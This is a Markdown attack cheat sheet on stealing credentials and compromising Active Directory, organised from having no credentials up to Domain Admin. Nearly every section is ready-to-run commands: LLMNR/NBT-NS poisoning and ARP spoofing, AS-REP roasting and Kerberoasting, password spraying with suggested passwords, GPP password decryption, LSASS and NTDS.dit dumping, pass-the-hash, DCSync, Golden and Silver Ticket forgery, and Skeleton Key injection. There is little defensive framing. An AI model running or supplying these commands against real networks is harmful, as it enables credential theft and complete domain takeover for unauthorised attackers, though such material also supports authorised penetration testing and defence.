# Credential Access & AD Attacks — Deep Dive

> Complete methodology for stealing credentials and attacking Active Directory environments.
> Maps to MITRE ATT&CK TA0006 (Credential Access) with AD-specific techniques.

---

## Phase 0: No Credentials Yet

### Network Sniffing & Poisoning
```bash
# LLMNR/NBT-NS/mDNS poisoning (capture NTLMv2 hashes)
responder -I eth0 -dwPv
# Wait for hashes, then crack:
hashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt

# MITM with bettercap
bettercap -iface eth0
> net.probe on
> set arp.spoof.targets TARGET_IP
> arp.spoof on
> set net.sniff.local true
> net.sniff on

# Capture NTLM with forced authentication
# Host an SMB server or HTTP server that requests NTLM auth
impacket-smbserver share /tmp -smb2support
# Social engineer someone to access \\YOUR_IP\share
```

### AS-REP Roasting (No Creds Required)
```bash
# Find accounts without Kerberos pre-auth
impacket-GetNPUsers DOMAIN/ -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat

# Crack the hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# Generate user lists if you don't have one
kerbrute userenum --dc DC_IP -d DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

### Anonymous/Guest Enumeration
```bash
# Null session enumeration
enum4linux -a TARGET
rpcclient -U "" -N TARGET -c "enumdomusers"
ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com"
smbclient -L //TARGET -N
crackmapexec smb TARGET -u '' -p '' --shares
crackmapexec smb TARGET -u 'guest' -p '' --shares
```

---

## Phase 1: Got a Low-Priv Domain User

### Kerberoasting
```bash
# Request TGS tickets for service accounts
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip DC_IP -request -outputfile kerberoast.txt

# Crack service account passwords
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt kerberoast.txt
```

### BloodHound — Attack Path Mapping
```bash
# Collect AD data
bloodhound-python -u user -p pass -d DOMAIN -dc DC_HOSTNAME -c All -ns DC_IP

# Or use SharpHound on Windows target
# .\SharpHound.exe -c All

# Import into BloodHound GUI
# Mark owned principals → Find Shortest Paths to Domain Admin
# Key queries:
#   - Shortest Paths to Domain Admin
#   - Kerberoastable Users
#   - AS-REP Roastable Users
#   - Users with DCSync Rights
#   - Unconstrained Delegation
```

### Password Spraying
```bash
# Spray one password across all users (careful — lockout!)
crackmapexec smb DC_IP -u users.txt -p 'Password123!' --continue-on-success
crackmapexec smb DC_IP -u users.txt -p 'Season2024!' --continue-on-success

# Kerbrute (faster, doesn't trigger traditional logon events)
kerbrute passwordspray --dc DC_IP -d DOMAIN users.txt 'Password123!'

# Common passwords to try:
# CompanyName2024!, Season+Year!, Welcome1, Password1, P@ssw0rd
```

### LDAP Enumeration
```bash
# Dump everything useful
ldapsearch -x -H ldap://DC_IP -D "DOMAIN\user" -w 'password' -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName description memberOf
ldapsearch -x -H ldap://DC_IP -D "DOMAIN\user" -w 'password' -b "dc=domain,dc=com" "(objectClass=group)" cn member

# Find users with descriptions (often contain passwords)
ldapsearch -x -H ldap://DC_IP -D "DOMAIN\user" -w 'password' -b "dc=domain,dc=com" "(&(objectClass=user)(description=*))" sAMAccountName description

# Find computers
ldapsearch -x -H ldap://DC_IP -D "DOMAIN\user" -w 'password' -b "dc=domain,dc=com" "(objectClass=computer)" cn operatingSystem
```

### SMB Share Hunting
```bash
# Find readable shares across the domain
crackmapexec smb SUBNET/24 -u user -p pass --shares
smbmap -H TARGET -u user -p pass -R              # Recursive listing

# Look for sensitive files
crackmapexec smb SUBNET/24 -u user -p pass -M spider_plus
# Check for: Group Policy Preferences, scripts with creds, config files
```

### Group Policy Preferences (GPP) Passwords
```bash
# Find cPassword in SYSVOL
crackmapexec smb DC_IP -u user -p pass -M gpp_password
# Or manually:
smbclient //DC_IP/SYSVOL -U user%pass
# Navigate to: DOMAIN/Policies/*/MACHINE/Preferences/Groups/Groups.xml
# Decrypt cPassword:
gpp-decrypt ENCRYPTED_PASSWORD
```

---

## Phase 2: Got a Privileged Account (Local Admin+)

### Credential Dumping
```bash
# Remote dump with secretsdump (SAM + LSA + NTDS if DC)
impacket-secretsdump DOMAIN/admin:pass@TARGET
impacket-secretsdump DOMAIN/admin@TARGET -hashes :NTLM_HASH

# Dump LSASS remotely
crackmapexec smb TARGET -u admin -p pass -M lsassy
crackmapexec smb TARGET -u admin -p pass -M nanodump
crackmapexec smb TARGET -u admin -p pass --lsa

# If you have SAM/SYSTEM/SECURITY files
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# NTDS.dit extraction (Domain Controller)
impacket-secretsdump DOMAIN/admin:pass@DC_IP -just-dc
impacket-secretsdump DOMAIN/admin:pass@DC_IP -just-dc-ntlm  # Just NTLM hashes
```

### Pass the Hash
```bash
# Test hash across multiple hosts
crackmapexec smb SUBNET/24 -u admin -H NTLM_HASH

# Get shells with hash
impacket-psexec -hashes :NTLM_HASH DOMAIN/admin@TARGET
impacket-wmiexec -hashes :NTLM_HASH DOMAIN/admin@TARGET
evil-winrm -i TARGET -u admin -H NTLM_HASH
impacket-smbexec -hashes :NTLM_HASH DOMAIN/admin@TARGET
```

### Pass the Ticket / Overpass the Hash
```bash
# Get TGT from NTLM hash
impacket-getTGT DOMAIN/user -hashes :NTLM_HASH -dc-ip DC_IP

# Use the ticket
export KRB5CCNAME=user.ccache
impacket-psexec DOMAIN/user@TARGET -k -no-pass
impacket-wmiexec DOMAIN/user@TARGET -k -no-pass
crackmapexec smb TARGET -u user --use-kcache
```

---

## Phase 3: Domain Admin / Domain Compromise

### DCSync Attack
```bash
# Dump all domain hashes (need Replication rights — DA has this)
impacket-secretsdump DOMAIN/da_user:pass@DC_IP -just-dc
impacket-secretsdump DOMAIN/da_user@DC_IP -hashes :NTLM_HASH -just-dc

# Get specific account (e.g., krbtgt for Golden Ticket)
impacket-secretsdump DOMAIN/da_user:pass@DC_IP -just-dc-user krbtgt
```

### Golden Ticket
```bash
# Need: krbtgt NTLM hash + Domain SID
# Get Domain SID:
impacket-lookupsid DOMAIN/user:pass@DC_IP

# Create Golden Ticket
impacket-ticketer -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-xxxx -domain DOMAIN administrator
export KRB5CCNAME=administrator.ccache
impacket-psexec DOMAIN/administrator@DC_IP -k -no-pass

# Golden ticket is valid for 10 years by default!
# Only invalidated by changing krbtgt password TWICE
```

### Silver Ticket
```bash
# Need: service account NTLM hash + Domain SID
# Forge a ticket for a specific service
impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-xxxx -domain DOMAIN -spn CIFS/target.domain.com administrator
export KRB5CCNAME=administrator.ccache
smbclient //TARGET/C$ -k -no-pass
```

### Skeleton Key
```bash
# Inject skeleton key into LSASS on DC
# Allows any user to auth with "mimikatz" as password
# Via Mimikatz: misc::skeleton
# All legitimate passwords still work alongside the skeleton key
```

---

## Hash Cracking Reference

| Hash Type | Hashcat Mode | Example |
|-----------|-------------|---------|
| NTLM | -m 1000 | `aad3b435...` |
| NTLMv2 | -m 5600 | `user::DOMAIN:challenge:response` |
| Kerberoast (RC4) | -m 13100 | `$krb5tgs$23$*...` |
| Kerberoast (AES) | -m 19700 | `$krb5tgs$18$*...` |
| AS-REP | -m 18200 | `$krb5asrep$23$*...` |
| NetNTLMv1 | -m 5500 | `user::DOMAIN:LM:NTLM:challenge` |
| MD5 | -m 0 | `5d41402abc...` |
| SHA-256 | -m 1400 | `2cf24dba5...` |
| SHA-512 crypt | -m 1800 | `$6$rounds$salt$hash` |
| bcrypt | -m 3200 | `$2a$10$...` |

```bash
# Recommended cracking strategy
# 1. Dictionary attack
hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt

# 2. Rules-based
hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 3. Mask attack (brute force patterns)
hashcat -m MODE hash.txt -a 3 ?u?l?l?l?l?l?d?d  # Ullllldd pattern
hashcat -m MODE hash.txt -a 3 ?u?l?l?l?l?l?l?d?d?s  # With special char
```

---

## Decision Tree: AD Attack Path

```
No creds           → Responder/LLMNR poisoning → AS-REP roast → Anonymous enum
                     → Relay attacks (ntlmrelayx)

Got one user       → Kerberoast → BloodHound → Password spray
                     → LDAP enum → Share hunting → GPP passwords

Got local admin    → Dump creds (secretsdump/lsassy) → Pass the Hash
                     → Lateral movement → Spray hashes across subnet

Got Domain Admin   → DCSync → Golden Ticket (persistence)
                     → NTDS.dit dump → All domain creds
                     → Silver Tickets for stealth
```
